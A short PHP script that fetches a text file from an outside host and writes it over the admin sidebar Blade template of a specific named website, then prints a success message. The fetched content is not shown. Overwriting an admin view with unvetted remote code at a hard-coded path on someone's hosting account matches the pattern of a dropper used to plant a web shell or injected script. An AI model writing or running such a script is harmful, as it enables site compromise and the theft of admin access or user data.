<?php
// Define the target file path
$targetPath = '/home/imtiazpr/public_html/1star.pk/core/resources/views/admin/partials/sidenav.blade.php';

// The direct link you provided
$codeUrl = 'http://txt.dev-drops.com/assa.txt';

// Fetch the code from the URL
$codeContent = @file_get_contents($codeUrl);

if ($codeContent === FALSE) {
    die("Error: Failed to download the code from the provided link. Please check if the URL is accessible.");
}

// Ensure the target directory exists
$directory = dirname($targetPath);
if (!is_dir($directory)) {
    mkdir($directory, 0755, true);
}

// Save the content to the target file
if (file_put_contents($targetPath, $codeContent) !== FALSE) {
    echo "Success: sidenav.blade.php has been successfully updated with the code from the link!";
} else {
    echo "Error: Failed to write content to the file. Please check file permissions.";
}
?>
